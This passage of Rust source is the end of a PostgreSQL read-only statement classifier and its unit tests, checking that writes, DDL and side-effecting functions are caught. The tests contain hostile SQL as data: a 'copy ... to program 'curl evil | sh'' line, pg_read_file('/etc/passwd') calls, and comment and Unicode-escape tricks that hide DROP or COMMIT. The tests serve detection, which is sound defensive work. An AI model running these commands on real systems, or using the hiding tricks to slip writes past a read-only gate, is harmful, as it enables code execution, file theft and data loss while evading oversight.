    let inner = inner.strip_suffix('"').unwrap_or(inner);
    (
        inner.replace("\"\"", "\"").to_ascii_lowercase(),
        unicode && inner.contains('\\'),
    )
}

/// The first function call in the statement that has side effects a READ ONLY transaction does
/// not stop, as `name()` for the summary. A token scan over the lexed statement: strings and
/// comments are never code, and every identifier followed by `(` is treated as a call, so
/// calls inside subqueries, CTEs, `FROM` table functions, `LATERAL` and `EXPLAIN` are all seen.
fn side_effect_function(text: &str) -> Option<String> {
    let w = Words::new(text);
    for k in 0..w.code.len() {
        let Some(t) = w.tok(k) else { continue };
        if !matches!(t.kind, TokKind::Word | TokKind::QuotedIdent) || !w.is_punct(text, k + 1, "(")
        {
            continue;
        }
        let (name, obfuscated) = ident_text(text, t);
        if obfuscated {
            return Some("a function whose name is hidden by Unicode escapes".to_string());
        }
        let schema = if k >= 2 && w.is_punct(text, k - 1, ".") {
            w.tok(k - 2)
                .filter(|s| matches!(s.kind, TokKind::Word | TokKind::QuotedIdent))
                .map(|s| ident_text(text, s))
        } else {
            None
        };
        if schema.as_ref().is_some_and(|s| s.1) {
            return Some("a function whose schema is hidden by Unicode escapes".to_string());
        }
        let schema = schema.map(|s| s.0);
        if is_side_effect_fn(schema.as_deref(), &name) {
            return Some(format!("{name}()"));
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use StatementClass::*;

    // ---- splitter ----

    #[test]
    fn split_basic() {
        assert_eq!(
            split_statements("select 1; select 2;"),
            vec!["select 1", "select 2"]
        );
        assert_eq!(split_statements("select 1"), vec!["select 1"]);
        assert_eq!(
            split_statements("  \n select 1 ;\n\n ; ;  "),
            vec!["select 1"]
        );
        assert!(split_statements("").is_empty());
        assert!(split_statements(" ; ; ").is_empty());
    }

    #[test]
    fn split_single_quotes_and_escapes() {
        assert_eq!(
            split_statements("select 'a;b'; select 2"),
            vec!["select 'a;b'", "select 2"]
        );
        assert_eq!(
            split_statements("select 'it''s; fine'; select 2"),
            vec!["select 'it''s; fine'", "select 2"]
        );
        // Standard strings: backslash is an ordinary character.
        assert_eq!(
            split_statements(r"select 'a\'; select 2"),
            vec![r"select 'a\'", "select 2"]
        );
    }

    #[test]
    fn split_e_strings() {
        assert_eq!(
            split_statements(r"select E'it\'s; here'; select 2"),
            vec![r"select E'it\'s; here'", "select 2"]
        );
        assert_eq!(
            split_statements(r"select e'a\\'; select 2"),
            vec![r"select e'a\\'", "select 2"]
        );
        // An identifier ending in `e` followed by a quote is NOT an E-string.
        assert_eq!(
            split_statements(r"select some_e'a\'; select 2"),
            vec![r"select some_e'a\'", "select 2"]
        );
    }

    #[test]
    fn split_quoted_identifiers() {
        assert_eq!(
            split_statements(r#"select "a;b" from t; select 2"#),
            vec![r#"select "a;b" from t"#, "select 2"]
        );
        assert_eq!(
            split_statements(r#"select "a""b;" ; select 2"#),
            vec![r#"select "a""b;""#, "select 2"]
        );
        assert_eq!(
            split_statements(r#"select U&"d\0061t;" ; select 2"#).len(),
            2
        );
    }

    #[test]
    fn split_dollar_quotes() {
        let f = "create function f() returns int as $$ begin; select 1; return 1; end $$ language plpgsql; select 2";
        let parts = split_statements(f);
        assert_eq!(parts.len(), 2);
        assert!(parts[0].ends_with("language plpgsql"));
        let tagged = "do $body$ begin perform 1; end $body$; select $a$x;$$y$a$; select 3";
        let parts = split_statements(tagged);
        assert_eq!(
            parts,
            vec![
                "do $body$ begin perform 1; end $body$",
                "select $a$x;$$y$a$",
                "select 3"
            ]
        );
        // `$1` parameters are not dollar quotes.
        assert_eq!(
            split_statements("select $1; select $2"),
            vec!["select $1", "select $2"]
        );
        // `$` inside an identifier is not a quote.
        assert_eq!(
            split_statements("select a$b$c; select 2"),
            vec!["select a$b$c", "select 2"]
        );
        // Unterminated dollar quote swallows the rest rather than panicking.
        assert_eq!(split_statements("select $x$ oops; select 2").len(), 1);
    }

    #[test]
    fn split_comments() {
        assert_eq!(
            split_statements("select 1 -- a;b\n; select 2"),
            vec!["select 1 -- a;b", "select 2"]
        );
        assert_eq!(
            split_statements("select /* ; */ 1; select 2"),
            vec!["select /* ; */ 1", "select 2"]
        );
        // Nested block comments.
        assert_eq!(
            split_statements("select /* a /* ; */ ; */ 1; select 2"),
            vec!["select /* a /* ; */ ; */ 1", "select 2"]
        );
        // Comment-only statements are dropped.
        assert_eq!(
            split_statements("-- hello\n; /* nothing */; select 1;"),
            vec!["select 1"]
        );
        assert!(split_statements("-- only a comment").is_empty());
        assert!(split_statements("/* a */ ; -- b\n ;").is_empty());
        // Leading comments stay with their statement.
        assert_eq!(
            split_statements("-- why\nselect 1; select 2"),
            vec!["-- why\nselect 1", "select 2"]
        );
        // Unterminated block comment: rest is one comment.
        assert_eq!(
            split_statements("select 1; /* open ; select 2"),
            vec!["select 1"]
        );
    }

    #[test]
    fn split_unterminated_and_unicode() {
        assert_eq!(
            split_statements("select 'oops; select 2"),
            vec!["select 'oops; select 2"]
        );
        assert_eq!(
            split_statements("select \"oops; select 2"),
            vec!["select \"oops; select 2"]
        );
        assert_eq!(
            split_statements("select 'héllo;wörld'; select 'ü'; select ü"),
            vec!["select 'héllo;wörld'", "select 'ü'", "select ü"]
        );
        assert_eq!(split_statements("select 'a\\' ;"), vec!["select 'a\\'"]);
    }

    #[test]
    fn split_begin_atomic_function() {
        let sql = "create function f() returns int language sql begin atomic select 1; select case when true then 2 end; end; select 9";
        let parts = split_statements(sql);
        assert_eq!(parts.len(), 2, "{parts:?}");
        assert!(parts[0].ends_with("end"));
        assert_eq!(parts[1], "select 9");
        // Plain BEGIN … is a transaction, not an atomic body.
        assert_eq!(
            split_statements("begin; select 1; commit"),
            vec!["begin", "select 1", "commit"]
        );
    }

    #[test]
    fn split_survives_unparseable_sql() {
        let sql = "this is not sql ;; neither is @@ this; select 1";
        assert_eq!(
            split_statements(sql),
            vec!["this is not sql", "neither is @@ this", "select 1"]
        );
    }

    // ---- classifier ----

    fn one(sql: &str) -> StatementClass {
        let c = classify(sql);
        assert_eq!(c.statements.len(), 1, "{sql}: {c:?}");
        c.overall
    }

    #[test]
    fn reads() {
        for sql in [
            "select 1",
            "SELECT * FROM users WHERE name = 'delete; drop table x'",
            "select a from t order by 1 limit 5 offset 2",
            "(select 1) union all (select 2)",
            "select 1 union select 2",
            "values (1), (2)",
            "show search_path",
            "show all",
            "with x as (select 1) select * from x",
            "with recursive r(n) as (select 1 union all select n+1 from r where n < 5) select * from r",
            "select * from (select * from t) s join u on true",
            "select \"update\", \"delete\" from t",
            "select * from t where note = 'for update'",
            "/* insert into x */ select 1",
            "-- delete from x\nselect 1",
            "show transaction isolation level",
            "show server_version",
            "select current_setting('search_path')",
            "explain select 1",
            "explain (format json) select * from t",
        ] {
            assert_eq!(one(sql), ReadOnly, "{sql}");
        }
    }

    #[test]
    fn selects_with_side_effects_are_writes() {
        assert_eq!(one("select * into newt from t"), Write);
        assert_eq!(one("select * into temp tmp from t"), Write);
        assert_eq!(one("select * from t for update"), Write);
        assert_eq!(one("select * from t for share"), Write);
        assert_eq!(one("select * from t for no key update"), Write);
        assert_eq!(one("select * from t for key share skip locked"), Write);
        assert_eq!(one("select * from (select * from t for update) s"), Write);
        assert_eq!(
            one("with d as (delete from t returning *) select * from d"),
            Write
        );
        assert_eq!(
            one("with i as (insert into t values (1) returning id) select * from i"),
            Write
        );
        assert_eq!(
            one("with u as (update t set a = 1 returning *) select * from u"),
            Write
        );
        assert_eq!(
            one("with x as (select 1), d as (delete from t) select * from x"),
            Write
        );
        assert_eq!(
            one("with recursive x as (select 1) insert into t select * from x"),
            Write
        );
        assert_eq!(one("select 1 union select * into x from t"), Write);
        // An empty target list (valid PostgreSQL) does not hide the write.
        assert_eq!(one("select into newt from t"), Write);
        assert_eq!(one("select into newt"), Write);
        assert_eq!(one("select from t for update"), Write);
        assert_eq!(one("select for update"), Write);
    }

    #[test]
    fn explain_rules() {
        // The class of EXPLAIN is the class of what it explains, executed or not.
        assert_eq!(one("explain select 1"), ReadOnly);
        assert_eq!(one("explain verbose select * from t"), ReadOnly);
        assert_eq!(one("explain analyze select 1"), ReadOnly);
        assert_eq!(
            one("explain (analyze, format json) select * from t"),
            ReadOnly
        );
        assert_eq!(one("explain delete from t"), Write);
        assert_eq!(one("explain (format json) update t set a = 1"), Write);
        assert_eq!(one("explain analyze delete from t"), Write);
        assert_eq!(one("explain analyse verbose update t set a = 1"), Write);
        assert_eq!(
            one("explain (analyze, buffers) insert into t values (1)"),
            Write
        );
        assert_eq!(one("explain (analyze true) drop table t"), Ddl);
        assert_eq!(one("explain (analyze false) delete from t"), Write);
        assert_eq!(one("explain (analyze off, verbose) delete from t"), Write);
        assert_eq!(
            one("explain analyze with d as (delete from t returning *) select * from d"),
            Write
        );
        assert_eq!(one("explain select * from t for update"), Write);
        assert_eq!(one("explain execute stmt"), Unknown);
        assert_eq!(one("explain analyze call p()"), Unknown);
    }

    /// Reviewer finding: `EXPLAIN ("analyze") DELETE …` was read-only.
    #[test]
    fn explain_analyze_option_spellings_are_never_read_only() {
        for sql in [
            r#"explain ("analyze") delete from t"#,
            r#"explain ("ANALYZE") delete from t"#,
            r#"explain ("analyze", format text) update t set a = 1"#,
            r#"explain ("analyze", format text) drop table t"#,
            "explain (ANALYZE) delete from t",
            "explain (Analyze True) delete from t",
            "explain (analyze on) delete from t",
            "explain (analyze 1) delete from t",
            "explain (analyse) delete from t",
            "explain (verbose, analyze true) insert into t values (1)",
            "explain /* c */ ( /* c */ analyze /* c */ ) delete from t",
            "explain (analyze 'yes') delete from t",
            "explain (analyze (1)) delete from t",
        ] {
            let c = classify(sql);
            assert!(c.overall >= Write, "{sql}: {c:?}");
            assert!(
                c.summary.contains("EXPLAIN ANALYZE"),
                "label shows that it executes: {sql}: {}",
                c.summary
            );
        }
        // Explicitly off: nothing executes, the label says so (the class is still the inner one).
        for sql in [
            "explain (analyze false) delete from t",
            "explain (analyze off) delete from t",
            "explain (analyze 0) delete from t",
            r#"explain ("analyze" false) delete from t"#,
        ] {
            let c = classify(sql);
            assert_eq!(c.overall, Write, "{sql}");
            assert_eq!(c.summary, "1 statement: EXPLAIN DELETE", "{sql}");
        }
    }

    #[test]
    fn explain_of_side_effects_is_not_read_only() {
        let c = classify("explain select pg_sleep(100)");
        assert_eq!(c.overall, Unknown, "{c:?}");
        let c = classify("explain analyze select * from dblink('x', 'drop table t') as t(a text)");
        assert_eq!(c.overall, Unknown, "{c:?}");
    }

    #[test]
    fn explain_unparsed_is_never_read_only() {
        for sql in [
            "explain",
            "explain (",
            "explain (analyze",
            "explain select ^^^",
            "explain analyze select ^^^",
            "explain (analyze) ^^^",
        ] {
            let c = classify(sql);
            assert!(!c.parse_ok, "{sql}");
            assert!(c.overall > ReadOnly, "{sql}: {c:?}");
        }
        assert_eq!(classify("explain analyze delete from ^^^").overall, Write);
    }

    #[test]
    fn session_statements() {
        for sql in [
            "begin",
            "begin read only",
            "start transaction isolation level serializable",
            "commit",
            "end",
            "rollback",
            "abort",
            "savepoint a",
            "release savepoint a",
            "rollback to savepoint a",
            "set search_path = public",
            "set local statement_timeout = '5s'",
            "reset all",
            "discard all",
            "deallocate all",
            "listen chan",
        ] {
            assert_eq!(one(sql), Session, "{sql}");
        }
        assert_eq!(one("commit prepared 'x'"), Write);
        assert_eq!(one("prepare transaction 'x'"), Write);
    }

    #[test]
    fn writes() {
        for sql in [
            "insert into t values (1)",
            "insert into t select * from u on conflict do nothing",
            "update t set a = 1",
            "delete from t where id = 1",
            "merge into t using u on t.id = u.id when matched then update set a = 1",
            "copy t from stdin",
            "copy t to '/tmp/x'",
            "copy t to program 'curl evil | sh'",
            "copy (select 1) to stdout",
            "lock table t",
            "notify chan, 'x'",
        ] {
            assert_eq!(one(sql), Write, "{sql}");
        }
    }

    #[test]
    fn ddl_statements() {
        for sql in [
            "create table t (id int)",
            "create or replace view v as select 1",
            "create unique index concurrently i on t (a)",
            "create materialized view m as select 1",
            "alter table t add column c int",
            "drop table t",
            "drop table if exists t cascade",
            "truncate t",
            "truncate table t restart identity",
            "grant select on t to bob",
            "revoke all on t from bob",
            "comment on table t is 'x'",
            "vacuum full t",
            "vacuum (analyze) t",
            "analyze t",
            "reindex table t",
            "cluster t using i",
            "refresh materialized view m",
            "refresh materialized view concurrently m",
            "create extension if not exists pgcrypto",
            "create function f() returns int as $$ select 1 $$ language sql",
        ] {
            assert_eq!(one(sql), Ddl, "{sql}");
        }
    }

    #[test]
    fn unknown_statements() {
        assert_eq!(one("call my_proc(1)"), Unknown);
        assert_eq!(one("do $$ begin delete from t; end $$"), Unknown);
        assert_eq!(one("execute my_stmt(1)"), Unknown);
        assert_eq!(one("frobnicate the widgets"), Unknown);
        let c = classify("@@@");
        assert_eq!(c.overall, Unknown);
        assert!(!c.parse_ok);
    }

    #[test]
    fn unparseable_falls_back_on_keyword_but_never_to_read_only() {
        // Garbage tail: sqlparser rejects it. Unparsed text is never read-only.
        let c = classify("select 1 from wibble wobble wubble ^^^ !!!");
        assert!(!c.parse_ok);
        assert_eq!(c.overall, Unknown);
        let c = classify("insert into ^^^");
        assert!(!c.parse_ok);
        assert_eq!(c.overall, Write);
        let c = classify("create table ^^^");
        assert_eq!(c.overall, Ddl);
        // An unparseable SELECT that mentions a write word is a write.
        let c = classify("select ^^^ into x from t");
        assert!(!c.parse_ok);
        assert_eq!(c.overall, Write);
        let c = classify("with ^^^ as (delete from t) select 1");
        assert_eq!(c.overall, Write);
        // SHOW variants sqlparser cannot parse go to approval.
        for sql in ["show ^^^", "show tables", "show", "table users"] {
            let c = classify(sql);
            assert_eq!(c.overall, Unknown, "{sql}: {c:?}");
        }
    }

    /// Fail-closed property: whatever the text, `parse_ok == false` never yields read-only.
    #[test]
    fn unparsed_text_is_never_read_only() {
        let fragments = [
            "select", "with", "values", "table", "show", "explain", "(", ")", "^^^", "!!!", "from",
            "t", "1", ",", "'x'", "\"q\"", "--c\n", "--c\r", "/* c */", "$$ x $$", "union", "all",
            "as", "set", "begin", "commit", "@", "#", "::int", "limit", "where", "e'\\''",
        ];
        let mut n = 0u32;
        let mut seed = 0x2545_f491_4f6c_dd1du64;
        for _ in 0..4000 {
            let mut sql = String::new();
            for _ in 0..(1 + (seed % 7)) {
                seed ^= seed << 13;
                seed ^= seed >> 7;
                seed ^= seed << 17;
                sql.push_str(fragments[(seed % fragments.len() as u64) as usize]);
                sql.push(' ');
            }
            let c = classify(&sql);
            if !c.parse_ok && !c.statements.is_empty() {
                n += 1;
                for (i, class) in c.statements.iter().enumerate() {
                    // Only statements that did not parse are constrained; find them via re-split.
                    let parts = split_statements(&sql);
                    let one = classify(&parts[i]);
                    if !one.parse_ok {
                        assert_ne!(*class, ReadOnly, "{sql:?} -> {c:?}");
                    }
                }
            }
        }
        assert!(
            n > 500,
            "the generator should produce many unparsed scripts: {n}"
        );
    }

    #[test]
    fn multi_statement_scripts() {
        let c = classify("select 1; update t set a = 1; drop table t");
        assert_eq!(c.statements, vec![ReadOnly, Write, Ddl]);
        assert_eq!(c.overall, Ddl);
        assert!(c.parse_ok);
        assert_eq!(c.summary, "3 statements: SELECT, UPDATE, DROP TABLE");

        let c = classify("begin; delete from t; commit;");
        assert_eq!(c.statements, vec![Session, Write, Session]);
        assert_eq!(c.overall, Write);

        let c = classify("select 1; call p()");
        assert_eq!(c.overall, Unknown);
    }

    #[test]
    fn tricky_quoting_does_not_hide_statements() {
        // Semicolon inside a string must not split; the DROP after it must still be seen.
        let c = classify("select 'a;b'; drop table t");
        assert_eq!(c.statements, vec![ReadOnly, Ddl]);
        // Dollar-quote hiding a DELETE inside a read-only looking statement is just a string.
        let c = classify("select $$; delete from t; $$");
        assert_eq!(c.statements, vec![ReadOnly]);
        // E-string with escaped quote followed by a real statement.
        let c = classify(r"select E'\'; drop table t; --'; delete from t");
        assert_eq!(c.statements, vec![ReadOnly, Write]);
        // Comment tricks: the update is real, the comment text is not.
        let c = classify("select 1 /* ; */; /* x */ update t set a = 1 -- trailing");
        assert_eq!(c.statements, vec![ReadOnly, Write]);
        // Quoted identifiers that look like keywords.
        let c = classify(r#"select "drop" from "delete""#);
        assert_eq!(c.overall, ReadOnly);
    }

    #[test]
    fn empty_input() {
        let c = classify("   ");
        assert!(c.statements.is_empty());
        assert_eq!(c.overall, ReadOnly);
        assert!(c.parse_ok);
        assert_eq!(c.summary, "no statements");
        let c = classify("-- nothing\n/* here */");
        assert!(c.statements.is_empty());
    }

    #[test]
    fn summary_wording() {
        assert_eq!(classify("select 1").summary, "1 statement: SELECT");
        assert_eq!(
            classify("explain analyze delete from t").summary,
            "1 statement: EXPLAIN ANALYZE DELETE"
        );
        assert_eq!(
            classify("create unique index i on t(a)").summary,
            "1 statement: CREATE INDEX"
        );
        assert_eq!(classify("values (1)").summary, "1 statement: VALUES");
        assert_eq!(
            classify("select * from t for update").summary,
            "1 statement: SELECT FOR UPDATE/SHARE"
        );
    }

    // ---- CR-terminated comments (reviewer CRITICAL) ----

    /// PostgreSQL ends `--` comments at `\r` as well as `\n`.
    #[test]
    fn cr_terminates_line_comments_in_the_splitter() {
        assert_eq!(
            split_statements("select 1 --x\rdrop table t"),
            vec!["select 1 --x\rdrop table t"],
            "no semicolon, still one statement"
        );
        assert_eq!(
            split_statements("select 1 --x\r; drop table t"),
            vec!["select 1 --x", "drop table t"]
        );
        // The `;` after the comment is real code on the next "line".
        assert_eq!(
            split_statements("--x\rselect 1;--y\rselect 2"),
            vec!["--x\rselect 1", "--y\rselect 2"]
        );
        // \r\n still terminates, and a lone \n does too.
        assert_eq!(
            split_statements("--x\r\nselect 1;--y\nselect 2"),
            vec!["--x\r\nselect 1", "--y\nselect 2"]
        );
        // U+2028 is NOT a PostgreSQL line terminator: it stays inside the comment.
        assert_eq!(
            split_statements("select 1 --x\u{2028}; drop table t"),
            vec!["select 1 --x\u{2028}; drop table t"]
                .into_iter()
                .map(String::from)
                .collect::<Vec<_>>()
        );
    }

    /// The exact reviewer probes: server runs COMMIT and DROP, classifier said "SHOW, SHOW".
    #[test]
    fn cr_probe_strings_are_not_read_only() {
        let c = classify("--x\rCOMMIT /*\nSHOW x */;\n--x\rDROP TABLE probe_victim /*\nSHOW x */");
        assert_eq!(c.statements, vec![Session, Ddl], "{c:?}");
        assert_eq!(c.overall, Ddl);
        assert_eq!(c.summary, "2 statements: COMMIT, DROP TABLE");

        let c = classify(
            "--x\rCOMMIT /*\nEXPLAIN SELECT 1 */;\n--x\rINSERT INTO probe_victim VALUES (2) /*\nEXPLAIN SELECT 1 */",
        );
        assert_eq!(c.statements, vec![Session, Write], "{c:?}");

        let c = classify("select 1 --\r; commit; drop table probe_victim");
        assert_eq!(c.statements, vec![ReadOnly, Session, Ddl], "{c:?}");
    }

    #[test]
    fn cr_variants() {
        // Lone \r.
        assert_eq!(one("--x\rdrop table t"), Ddl);
        assert_eq!(one("--x\rinsert into t values (1)"), Write);
        assert_eq!(one("select 1 --x\rfrom t"), ReadOnly);
        // \r\n behaves like \n.
        assert_eq!(one("--x\r\ndrop table t"), Ddl);
        assert_eq!(one("--x\r\nselect 1"), ReadOnly);
        // Several \r in a row, \r at the end, \r inside a string.
        assert_eq!(one("--a\r\r\r--b\rdelete from t"), Write);
        assert_eq!(one("select 1 --a\r"), ReadOnly);
        assert_eq!(one("select 'a\rb'"), ReadOnly);
        // The comment hides nothing from the splitter in either direction.
        assert_eq!(
            classify("select 1 --a\r;\rdelete from t").statements,
            vec![ReadOnly, Write]
        );
        // U+2028 / U+0085 / form feed do not end a comment in PostgreSQL: statement stays a comment-only tail.
        assert_eq!(one("select 1 --x\u{2028}drop table t"), ReadOnly);
        assert_eq!(one("select 1 --x\u{0085}drop table t"), ReadOnly);
        // Nested block comments, with \r inside them, cannot end early here, but another engine
        // may end them at the first `*/`.
        assert_eq!(one("/* a /* b\r*/ drop table t\r*/ select 1"), Unknown);
        assert_eq!(
            classify("/* a /* b */ select 1; */ drop table t").statements,
            vec![Ddl]
        );
        assert_eq!(
            classify("select 1 /* /* ; */ ; */; drop table t").statements,
            vec![Unknown, Ddl]
        );
        // The comment/CR trick cannot hide a session statement either.
        let c = classify("--x\rbegin;\n--y\rselect 1;\r--z\rcommit");
        assert_eq!(c.statements, vec![Session, ReadOnly, Session]);
    }

    #[test]
    fn normalise_cr_only_touches_bare_cr() {
        assert_eq!(normalise_cr("a\r\nb"), "a\r\nb");
        assert_eq!(normalise_cr("a\rb"), "a\nb");
        assert_eq!(normalise_cr("a\r"), "a\n");
        assert_eq!(normalise_cr("a\r\rb\r\n"), "a\n\nb\r\n");
        assert!(matches!(normalise_cr("plain"), Cow::Borrowed(_)));
    }

    #[test]
    fn vertical_tab_is_whitespace() {
        assert_eq!(split_statements("select\u{b}1;\u{b}select 2").len(), 2);
    }

    // ---- fail closed ----

    #[test]
    fn read_only_requires_a_successful_parse() {
        for sql in [
            "select 1 from wibble wobble wubble ^^^ !!!",
            "explain select ^^^",
            "select 1 +",
            "select ,",
            "(",
            "values",
        ] {
            let c = classify(sql);
            assert!(!c.parse_ok, "{sql}");
            assert_ne!(c.overall, ReadOnly, "{sql}");
        }
        // Parsed forms that are read-only. PostgreSQL's target list is optional, so a bare
        // `select` is a valid query (one row, no columns) and sqlparser 0.64 parses it as such.
        for sql in [
            "select",
            "select from t where x = 1",
            "select 1",
            "show all",
            "show search_path",
            "values (1)",
            "explain select 1",
        ] {
            let c = classify(sql);
            assert!(c.parse_ok && c.overall == ReadOnly, "{sql}: {c:?}");
        }
    }

    #[test]
    fn session_statements_must_stand_alone() {
        // A session keyword followed by another statement the splitter did not separate.
        let c = classify("set x = 1 ^^^");
        assert_ne!(c.overall, ReadOnly);
        // Parsed multi-statement text under a session keyword is not trusted as session-only.
        assert_eq!(classify("begin atomic; select 1").statements.len(), 2);
        for sql in [
            "begin",
            "set local a = 'x;y'",
            "commit",
            "release savepoint a",
        ] {
            assert_eq!(one(sql), Session, "{sql}");
        }
    }

    // ---- side-effecting functions (reviewer HIGH) ----

    fn assert_flagged(sql: &str, func: &str) {
        let c = classify(sql);
        assert_eq!(c.overall, Unknown, "{sql}: {c:?}");
        assert!(
            c.summary.contains(&format!("calling {func}()")),
            "{sql}: {}",
            c.summary
        );
    }

    #[test]
    fn dblink_family_is_unknown() {
        assert_flagged(
            "select * from dblink('host=x', 'drop table t') as t(r text)",
            "dblink",
        );
        assert_flagged(
            "select dblink_exec('host=x', 'create table z()')",
            "dblink_exec",
        );
        assert_flagged("select dblink_connect('c', 'host=x')", "dblink_connect");
        assert_flagged(
            "select postgres_fdw_disconnect_all()",
            "postgres_fdw_disconnect_all",
        );
        assert_flagged("select dblink.anything(1)", "anything");
    }

    #[test]
    fn file_and_server_functions_are_unknown() {
        for (sql, f) in [
            ("select pg_read_file('/etc/passwd')", "pg_read_file"),
            (
                "select pg_read_binary_file('/etc/passwd')",
                "pg_read_binary_file",
            ),
            ("select * from pg_ls_dir('/')", "pg_ls_dir"),
            ("select * from pg_ls_waldir()", "pg_ls_waldir"),
            ("select pg_stat_file('/etc/passwd')", "pg_stat_file"),
            ("select pg_terminate_backend(123)", "pg_terminate_backend"),
            ("select pg_cancel_backend(123)", "pg_cancel_backend"),
            ("select pg_reload_conf()", "pg_reload_conf"),
            ("select pg_rotate_logfile()", "pg_rotate_logfile"),
            ("select pg_switch_wal()", "pg_switch_wal"),
            (
                "select pg_create_restore_point('x')",
                "pg_create_restore_point",
            ),
            (
                "select pg_logical_emit_message(true, 'p', 'm')",
                "pg_logical_emit_message",
            ),
            (
                "select pg_create_logical_replication_slot('s', 'test_decoding')",
                "pg_create_logical_replication_slot",
            ),
            (
                "select pg_drop_replication_slot('s')",
                "pg_drop_replication_slot",
            ),
            ("select pg_promote()", "pg_promote"),
            ("select pg_stat_reset()", "pg_stat_reset"),
        ] {
            assert_flagged(sql, f);
        }
    }

    #[test]
    fn locks_sleep_and_sequences_are_unknown() {
        for (sql, f) in [
            ("select pg_advisory_lock(1)", "pg_advisory_lock"),
            (
                "select pg_advisory_lock_shared(1, 2)",
                "pg_advisory_lock_shared",
            ),
            ("select pg_try_advisory_lock(1)", "pg_try_advisory_lock"),
            ("select pg_advisory_xact_lock(1)", "pg_advisory_xact_lock"),
            ("select pg_sleep(1000)", "pg_sleep"),
            ("select pg_sleep_for('1 day')", "pg_sleep_for"),
            ("select nextval('s')", "nextval"),
            ("select setval('s', 1)", "setval"),
            (
                "select set_config('transaction_read_only', 'off', false)",
                "set_config",
            ),
            ("select pg_notify('c', 'p')", "pg_notify"),
            ("select txid_current()", "txid_current"),
            ("select pg_current_xact_id()", "pg_current_xact_id"),
        ] {
            assert_flagged(sql, f);
        }
        // Reading sequence state, transaction ids without assigning one, and settings are fine.
        for sql in [
            "select currval('s')",
            "select lastval()",
            "select txid_current_snapshot()",
            "select pg_current_xact_id_if_assigned()",
            "select current_setting('transaction_read_only')",
            "select pg_get_serial_sequence('t', 'id')",
            "select pg_relation_size('t'), pg_database_size('d'), version(), now()",
        ] {
            assert_eq!(one(sql), ReadOnly, "{sql}");
        }
    }

    #[test]
    fn large_object_functions_are_unknown() {
        for (sql, f) in [
            ("select lo_import('/etc/hostname')", "lo_import"),
            ("select lo_export(1, '/tmp/x')", "lo_export"),
            ("select lo_unlink(1)", "lo_unlink"),
            ("select lo_create(0)", "lo_create"),
            ("select lo_put(1, 0, 'x')", "lo_put"),
            ("select lo_get(1)", "lo_get"),
            ("select lowrite(0, 'x')", "lowrite"),
            ("select loread(0, 1)", "loread"),
        ] {
            assert_flagged(sql, f);
        }
    }

    #[test]
    fn nested_comments_are_never_vouched_for() {
        let c = classify("/* /* */ DELETE FROM shop.orders -- */ select 1");
        assert_eq!(c.overall, Unknown);
        assert!(!c.parse_ok);
        assert_eq!(classify("/* plain */ select 1").overall, ReadOnly);
    }

    #[test]
    fn ts_stat_and_escaped_schemas_need_approval() {
        for sql in [
            "select * from ts_stat($$select pg_terminate_backend(1)::text::tsvector$$)",
            "select ts_rewrite('a'::tsquery, 'select 1')",
            r#"select U&"aws\005flambda".invoke('fn', '{}')"#,
        ] {
            assert_eq!(classify(sql).overall, Unknown, "{sql}");
        }
    }

    #[test]
    fn nested_sql_runners_are_unknown() {
        for (sql, f) in [
            (
                "select query_to_xml('delete from t returning *', true, false, '')",
                "query_to_xml",
            ),
            (
                "select query_to_xmlschema('select 1', true, false, '')",
                "query_to_xmlschema",
            ),
            (
                "select cursor_to_xml('c', 1, true, false, '')",
                "cursor_to_xml",
            ),
            ("select table_to_xml('t', true, false, '')", "table_to_xml"),
            ("select database_to_xml(true, false, '')", "database_to_xml"),
        ] {
            assert_flagged(sql, f);
        }
    }

    /// Redshift's workload and cluster administration functions are not reads.
    #[test]
    fn redshift_admin_functions_are_side_effects() {
        for sql in [
            "select change_query_priority(123, 'high')",
            "select change_session_priority(123, 'high')",
            "select change_user_priority('bob', 'high')",
            "select reboot_cluster()",
        ] {
            assert_eq!(classify(sql).overall, Unknown, "{sql}");
        }
    }

    /// The function can be hidden anywhere a call can appear.
    #[test]
    fn side_effect_functions_are_found_everywhere_in_the_ast() {
        for sql in [
            "select (select pg_sleep(1))",
            "select * from (select pg_advisory_lock(1)) s",
            "with x as (select pg_terminate_backend(1)) select * from x",
            "with recursive r as (select nextval('s') n union all select n from r) select * from r",
            "select * from t, lateral pg_ls_dir(t.p)",
            "select * from t where id in (select lo_unlink(1))",
            "select case when true then nextval('s') end",
            "select a from t order by pg_sleep(1)",
            "select 1 union all select nextval('s')",
            "values (pg_sleep(1))",
            "select * from rows from (dblink('x', 'y') as (a text), generate_series(1, 2))",
            "select f(g(h(pg_advisory_lock(1))))",
            "explain select pg_sleep(1)",
            "declare c cursor for select pg_terminate_backend(1)",
            "prepare p as select dblink_exec('x', 'y')",
        ] {
            let c = classify(sql);
            assert_eq!(c.overall, Unknown, "{sql}: {c:?}");
        }
    }

    #[test]
    fn side_effect_function_matching_ignores_case_quoting_schema_and_spacing() {
        for sql in [
            "SELECT PG_SLEEP(1)",
            "select Pg_Advisory_Lock(1)",
            r#"select "pg_sleep"(1)"#,
            r#"select "PG_SLEEP"(1)"#,
            r#"select pg_catalog.pg_sleep(1)"#,
            r#"select "pg_catalog"."pg_sleep"(1)"#,
            r#"select pg_catalog . pg_sleep (1)"#,
            "select pg_sleep/* c */(1)",
            "select pg_sleep -- c\n(1)",
            "select pg_sleep\n\t (1)",
            "select public.dblink('x', 'y')",
            "select \"dblink\"('x', 'y')",
            r#"select "a""b".pg_sleep(1)"#,
            "select cron.schedule('* * * * *', 'drop table t')",
            "select net.http_get('http://x')",
        ] {
            let c = classify(sql);
            assert_eq!(c.overall, Unknown, "{sql}: {c:?}");
        }
        // Unicode-escaped identifiers can spell anything: always flagged when called.
        let c = classify(r#"select U&"pg\005fsleep"(1)"#);
        assert_eq!(c.overall, Unknown, "{c:?}");
        assert!(c.summary.contains("hidden by Unicode escapes"));
    }

    #[test]
    fn side_effect_names_in_strings_comments_and_columns_are_not_calls() {
        for sql in [
            "select 'pg_sleep(1)'",
            "select $$ pg_sleep(1) $$",
            "select e'pg_sleep(1)\\n'",
            "select 1 /* pg_sleep(1) */",
            "select 1 -- pg_sleep(1)\n",
            "select pg_sleep from t",
            r#"select "pg_sleep" from t"#,
            "select nextval from t",
            "select t.lo_x from t",
            "select * from t where note = 'lo_import(x)'",
            "select count(*), sum(a), upper(b) from t group by c",
        ] {
            assert_eq!(one(sql), ReadOnly, "{sql}");
        }
    }

    #[test]
    fn side_effect_functions_in_writes_stay_writes() {
        // Already past read-only: the function does not downgrade or change the class.
        assert_eq!(one("insert into t values (nextval('s'))"), Write);
        assert_eq!(one("select pg_sleep(1) into x"), Write);
    }

    #[test]
    fn side_effect_summary_names_the_function() {
